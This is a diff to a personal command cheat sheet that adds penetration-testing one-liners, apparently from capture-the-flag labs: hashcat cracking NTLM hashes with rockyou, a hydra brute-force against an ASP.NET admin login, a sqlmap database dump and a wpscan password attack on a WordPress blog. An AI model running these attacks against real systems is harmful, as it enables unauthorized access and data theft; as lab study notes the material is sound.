@@ -95,3 +95,31 @@ bsc-elf-gdb sim-test.exe -ex "target remote | embdebug --soname sysc-bsc --vcd=t
 ```bash
 grep -rl 'notes/images' . | sort | uniq | xargs perl -e "s/assets/assets\/engineer-training/" -pi
 ```
+
+## Hashcat
+```bash
+hashcat -m 1000 pass.txt ../Desktop/rockyou.txt
+```
+
+## Hydra
+```bash
+hydra -l admin -P ../Desktop/rockyou.txt 10.10.187.151 http-post-form "/Account/login.aspx?ReturnURL=/admin:__VIEWSTATE=iL08cD6b3clJctyo0KNeEsuXx9w7SrkAtggDy0m16fdgDu1lU1uuo3uh6%2FRluRbkD9GutlhMGTHkzw5TKQ%2BHgSoGVo73vHE7yAY2Vsky3EyktnYS%2BIy0jb68wZvhEHGpOLmwYsk3M7NnT45B%2B2jaDdrRfwr94Ks2d1VIKp2LvcNs%2F6rd&__EVENTVALIDATION=5N%2Bcad1wYajo0H2m7Bq3nlBqYeKcha9MeicRSms1xOrJ8b9v%2FiDF9nj6Kge38NGN6KBMhWEtiNyCZFWTMItDUQu34YiMN8vVxQv6lQEgBw5RWhtEihlALnJsM5gAhf89mlKiwmAbHq2Lz0jR30paNwnGrt5M%2Fwj7m6oohs8%2F8JQKoaoM&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login Failed" -vv
+```
+
+## SQLmap
+```bash
+sqlmap -r request.txt --dbms=mysql --dump
+```
+
+## Wordpress
+Enumeration:
+
+```bash
+wpscan --url 10.10.101.40/blog
+```
+
+Look for vulnerable plugins and usernames:
+
+```bash
+wpscan --url 10.10.101.40/blog --usernames admin --passwords /usr/share/wordlists/rockyou.txt --max-threads 50
+```
